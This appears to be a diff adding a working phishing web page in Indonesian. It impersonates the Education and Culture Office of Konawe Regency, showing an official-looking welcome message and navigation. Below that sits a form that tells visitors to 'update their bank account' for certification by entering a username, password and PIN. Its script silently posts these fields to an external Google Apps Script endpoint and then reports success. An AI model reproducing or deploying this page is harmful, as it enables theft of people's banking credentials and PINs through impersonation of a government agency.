@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        :root {
+            --primary: #1e3a8a;
+
+        }
+        *{box-sizing: border-box;}
+        .input-group{
+            margin-bottom: 10px;
+            text-align: left;
+            padding: 5px;
+            width: 100%;
+
+
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .btn
+        {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: bold;
+            color: #ffffff;
+            background-color: #007bff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 8px;
+         
+        }
+        .btn:hover{
+            background-color: rgba(65, 65, 250)
+        } 
+        .header h1 {
+          font-size: 30px;
+          text-align: center;
+        }
+        .header h2 {
+          font-size: 30px;
+          text-align: center;
+        }
+        .section {
+          padding: 30px 10%;
+        }
+        .section-title{
+          text-align: center;
+          margin-bottom: 40px;
+          font-size: 30px;
+          
+        }
+        .about-container img{
+          height: 40rem;
+        
+        }
+
+        /* Reset dasar agar tampilan rapi */
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+}
+
+/* Styling Header & Navbar */
+header {
+  background-color: #ffffff;
+  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
+  position: sticky;
+  top: 0;
+  z-index: 1000;
+}
+
+.navbar {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 15px 20px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+/* Logo */
+.logo {
+  font-size: 1.5rem;
+  font-weight: 700;
+  color: #1e293b;
+  text-decoration: none;
+  letter-spacing: -0.5px;
+}
+
+/* Daftar Menu Desktop */
+.nav-links {
+  list-style: none;
+  display: flex;
+  align-items: center;
+  gap: 28px;
+}
+
+.nav-links a {
+  text-decoration: none;
+  color: #475569;
+  font-weight: 500;
+  font-size: 0.95rem;
+  transition: color 0.3s ease;
+}
+
+.nav-links a:hover {
+  color: #2563eb;
+}
+
+/* Tombol Khusus "Input Penjualan" */
+.btn-nav {
+  background-color: #2563eb;
+  color: #ffffff !important;
+  padding: 10px 18px;
+  border-radius: 6px;
+  font-weight: 600;
+  transition: background-color 0.3s ease;
+}
+
+.btn-nav:hover {
+  background-color: #1d4ed8;
+}
+
+/* Tombol Hamburger (Sembunyi di Desktop) */
+.menu-toggle {
+  display: none;
+  background: none;
+  border: none;
+  font-size: 1.6rem;
+  color: #1e293b;
+  cursor: pointer;
+}
+
+/* --- Tampilan Responsif untuk HP (Layar di bawah 768px) --- */
+@media (max-width: 768px) {
+  .menu-toggle {
+    display: block; /* Munculkan tombol ☰ */
+  }
+
+  .nav-links {
+    display: none; /* Sembunyikan menu secara default */
+    flex-direction: column;
+    position: absolute;
+    top: 100%;
+    left: 0;
+    width: 100%;
+    background-color: #ffffff;
+    padding: 20px;
+    gap: 18px;
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+    text-align: center;
+  }
+
+  /* Class tambahan saat tombol menu diklik via JavaScript */
+  .nav-links.active {
+    display: flex;
+  }
+
+  .btn-nav {
+    display: inline-block;
+    width: 100%;
+  }
+}
+footer {
+  background-color: brown;
+  color: #ffffff;
+  text-align: center;
+  padding: 30px 10%;
+  padding-bottom: 50px;
+}
+.navbar img{
+  width: 50px;
+  display: flex;
+  justify-content: flex-start;
+}
+.navbar image{
+  width: 100px;
+}
+    </style>
+</head>
+<body>
+ <header>
+    <nav class="navbar">
+      <a href="#" class="logo">Haidy/My.id</a>
+  
+      <button class="menu-toggle" id="menuToggle" aria-label="Buka Menu">☰</button>
+      <ul class="nav-links" id="navLinks">
+        <li><a href="#beranda">Beranda</a></li>
+        <li><a href="#keunggulan">Profil</a></li>
+        <li><a href="#katalog">Staf Dinas </a></li>
+        <!-- Ganti href di bawah dengan nama file form input Anda, misal: input.html -->
+        <li><a href="input.html" class="btn-nav">Menu</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <section id="profil" class="section">
+    <h2 class="section-title">sambutan Dinas Pendidikan Dan Kebudayaan</h2>
+    <p>Dinas Pendidikan dan Kebudayaan Kabupaten Konawe berkomitmen penuh dalam meningkatkan mutu layanan pendidikan yang merata, inklusif, dan berdaya saing di seluruh wilayah Kabupaten Konawe. Melalui peningkatan kualitas tenaga pendidik, pemerataan sarana prasarana sekolah, serta pemanfaatan teknologi pembelajaran, kami berupaya mencetak generasi penerus yang cerdas, berakhlak mulia, dan siap menghadapi tantangan masa depan tanpa melupakan nilai-nilai kearifan lokal budaya Tolaki.
+</p>
+    <div class="about-container">
+      <img src="img/WhatsApp Image 2026-11-25 at 04.30.10.jpeg">
+      <img src="img/WhatsApp Image 2026-11-25 at 05.52.14.jpeg">
+      
+      <h3> Dinas Pendidikan dan Kebudayaan Kabupaten Konawe berkomitmen penuh dalam meningkatkan
+         mutu layanan pendidikan yang merata, inklusif, dan berdaya saing di seluruh wilayah Kabupaten Konawe. Melalui peningkatan kualitas tenaga pendidik, pemerataan sarana prasarana sekolah, serta pemanfaatan teknologi pembelajaran, kami berupaya mencetak generasi penerus yang cerdas, berakhlak mulia, dan siap menghadapi tantangan masa depan tanpa melupakan nilai-nilai kearifan lokal budaya Tolaki.
+.</h3>
+      <p>Pendidikan adalah fondasi utama dalam membangun peradaban daerah. Dinas Pendidikan Kabupaten Konawe terus bersinergi bersama para guru, orang tua, dan seluruh elemen masyarakat untuk menghadirkan ruang belajar yang aman, nyaman, dan inspiratif bagi setiap anak di Kabupaten Konawe. Mari bersama-sama kita wujudkan generasi yang unggul dan berkarakter."
+.</p>
+    </div>
+  </section>
+    <div class="header">
+      <h1> Isi Data Anda Untuk Perbarui Rekening Bank</h1>
+    <h2>
+        silahkan login dan masukan Data Rekening sertifikasi anda
+    </h2>
+    </div>
+    
+      <form class="form-google" id="formData">
+        <div class="input-group">
+          
+          <input type="text" name ="nama" placeholder="Username" required>
+        </div>
+        <div class="input-group">
+
+          <input type="password" name ="password" placeholder="Password" required>
+        </div>
+        <div class="input-group">
+          
+          <input type="number" name ="pin" placeholder="PIN" required>
+        </div>
+        <button type="submit" class="btn" id="btnKirim">kirim</button>
+        <p id="status"></p>
+        </form>
+
+        <footer>
+          <P> & Copy; 2026 Dinas Pendidikan Kabupaten Konawe Hak cipta Dilindungi</P>
+        </footer>
+  <script>
+    const scriptURL = "https://script.google.com/macros/s/AKfycbx1u_IzZpQ_z8WSy0KAOvkekTRl-J0pKyMkGfh5Vax8-o6APUPCsuJR48oCnpPjQzbzwA/exec";
+    const form = document.getElementById("formData");
+    const btn = document.getElementById("btnKirim");
+    const statusTeks = document.getElementById("status");
+
+    form.addEventListener("submit", e => {
+      e.preventDefault();
+      btn.disabled = true;
+      btn.textContent = "Mengirim...";
+
+      fetch(scriptURL, { method: "POST", body: new FormData(form) })
+        .then(response => {
+          statusTeks.textContent = "Data berhasil disimpan!";
+          statusTeks.style.color = "green";
+          form.reset();
+        })
+        .catch(error => {
+          statusTeks.textContent = "Gagal mengirim data. Coba lagi.";
+          statusTeks.style.color = "red";
+        })
+        .finally(() => {
+          btn.disabled = false;
+          btn.textContent = "Kirim Data";
+        });
+    });
+  </script>
+      
+</body>
+</html>
